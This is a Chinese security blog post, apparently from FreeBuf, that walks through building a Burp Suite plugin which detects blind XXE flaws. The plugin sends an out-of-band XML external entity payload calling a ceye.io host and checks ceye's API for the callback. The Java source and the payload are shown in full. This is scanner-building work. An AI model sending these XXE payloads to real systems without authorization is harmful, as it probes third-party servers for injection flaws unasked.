## 0x00 前言

 **Burp没有自带检测XXE漏洞功能，也没有插件。于是自己开始动手撸一个XXE Scanner插件出来。**

## 0x01 检测原理

OOB
XXE盲攻击，利用ceye监控的http记录，我们再通过ceye给的api进行查询是否有利用XXE漏洞发送的http请求记录。使用如下payload。

    
    
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE root [
    <!ENTITY % remote SYSTEM "http://xxxx.ceye.io/xxe_test">
    %remote;]>
    <root/>
    

## 0x02 成品展示

首先需要一个ceye账号，将`Identifier(用于http请求到你的ceye账户下)`和`Token(用于API查询你的http请求记录)`分别填入到下图的文本框当中，点击保存。会在burp目录下生成xxe.config，以`Identifier|Token`格式保存着。下载启动burp的时候，XXE
Scanner插件会自动读取xxe.config，获取到上次保存的参数。

  
![1.png](https://image.3001.net/images/20180508/15257774271801.png!small)  

请求带`xxe_XXXXXXXXXX(10个随机字母或数字)`，用于后面判断是否利用XXE发送了http请求。

![2.png](https://image.3001.net/images/20180508/15257774367587.png!small)  

通过api查询，检测到带有`xxe_XXXXXXXXXX(10个随机字母或数字)`的请求，则报XXE inject。

![3.png](https://image.3001.net/images/20180508/15257774481087.png!small)  

## 0x03 插件开发

由于有需要填写配置参数，所以需要一个自定义tab页面。需要使用`ITab`接口，并且使用`IBurpExtenderCallbacks.addSuiteTab()`进行添加。新建`XxeOption`类继承`ITab`，然后再构造方法里面添加控件。

    
    
    public XxeOption(final IBurpExtenderCallbacks callbacks) {
        this.callbacks = callbacks;
        jp = new JPanel();
        jlId = new JLabel("Identifier:");
        jlToken = new JLabel("API Token:");
        jtfId = new JTextField(10);
        jtfToken = new JTextField(20);
        //设置Id,Token文本框
        File file = new File("xxe.config");
        if(file.exists()){
            String info = ReadConfig();
            if(info.contains("|"))
            {
                jtfId.setText(info.split("\|")[0]);
                jtfToken.setText(info.split("\|")[1]);
            }
        }
        jb = new JButton("保存");
        jb.addActionListener(this);
        jp.add(jlId);
        jp.add(jtfId);
        jp.add(jlToken);
        jp.add(jtfToken);
        jp.add(jb);
        callbacks.addSuiteTab(XxeOption.this);
    }
    

最后在`registerExtenderCallbacks`方法里实例化`XxeOption`即可。

`IScannerCheck`可以自定义扫描，一种是`doActiveScan`主动扫描，一种是`doPassiveScan`被动扫描。主动扫描是对每个参数进行扫描，会发送n次请求包。而被动扫描只会扫一次，将`doPassiveScan`函数代码走完一遍就完了。而检测XXE我们只需要发送一次数据包，所以选择被动扫描。

    
    
    public List<IScanIssue> doPassiveScan(IHttpRequestResponse baseRequestResponse) {
        //code
        return null;
    }
    

接下来就是发送xxe payload。使用`buildHttpMessage`将headr和body组合。再使用`makeHttpRequest`发送请求。

    
    
    //xxe payload
    byte[] xxePayload = ("<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
            "<!DOCTYPE root [\n" +
            "<!ENTITY % remote SYSTEM \"http://" + xxeOption.jtfId.getText() + "/" + flag + "\">\n" +
            "%remote;]>\n" +
            "<root/>").getBytes();
    //修改body为xxe payload，并且发送xxe payload http包
    byte[] xxe = helpers.buildHttpMessage(helpers.analyzeRequest(baseRequestResponse.getRequest()).getHeaders(),xxePayload);
    IHttpRequestResponse checkRequestResponse = callbacks.makeHttpRequest(
            baseRequestResponse.getHttpService(), xxe);
    

使用`makeHttpRequest`进行api接口查询。

    
    
    //构造发送到ceye.io的IHttpService
    IHttpService test = new IHttpService() {
        @Override
        public String getHost() {
            return "api.ceye.io";
        }
        @Override
        public int getPort() {
            return 80;
        }
        @Override
        public String getProtocol() {
            return "http";
        }
    };
    //构造发送到ceye.io的http headers信息
    byte[] ceye = ("GET /v1/records?token=" + xxeOption.jtfToken.getText() + "&type=request&filter=" + flag + " HTTP/1.1\n" +
            "Host: api.ceye.io\n" +
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0\n" +
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\n" +
            "Accept-Language: zh-CN,en-US;q=0.7,en;q=0.3\n" +
            "Accept-Encoding: gzip, deflate\n" +
            "DNT: 1\n" +
            "Connection: close\n" +
            "Upgrade-Insecure-Requests: 1\n" +
            "\n").getBytes();
    //stdout.println("GET /v1/records?token=" + xxeOption.jtfToken.getText() + "&type=request&filter=" + flag + " HTTP/1.1\n");
    //发送数据包到ceye.io
    IHttpRequestResponse ceyeRequestResponse = callbacks.makeHttpRequest(
            test, ceye);
    

对返回结果进行匹配。

    
    
    //设置ceye的返回包作为漏洞返回包
    checkRequestResponse.setResponse(ceyeRequestResponse.getResponse());
    //获取ceyeRequestResponse(发送到ceye的包)看是否有请求的关键词，如果有则有漏洞。
    List<int[]> matches = getMatches(ceyeRequestResponse.getResponse(), flag.getBytes());
    //checkRequestResponse(发送xee payload的包),对flag进行匹配，然后高亮再请求包中。
    List<int[]> requestMatches = getMatches(checkRequestResponse.getRequest(), flag.getBytes());
    //stdout.println(new String(checkRequestResponse.getRequest()));
    if(matches.size() > 0)
    {
        //报告漏洞
        List<IScanIssue> issues = new ArrayList<>(1);
        issues.add(new CustomScanIssue(
                baseRequestResponse.getHttpService(),
                helpers.analyzeRequest(baseRequestResponse).getUrl(),
                new IHttpRequestResponse[] { callbacks.applyMarkers(checkRequestResponse, requestMatches, matches) },
                "bind xxe inject",
                "payload: " + helpers.bytesToString(flag.getBytes()),
                "High"));
        return issues;
    }
    

## 0x04 参考

<https://portswigger.net/burp/extender/api/>

## 0x05 下载地址

[源码](https://github.com/lufeirider/Project/tree/master/XXEScanner/src)

[成品](https://github.com/lufeirider/Project/blob/master/XXEScanner/XXEScanner.jar)

 *** 本文作者lufei，转载注明来自FreeBuf.COM**

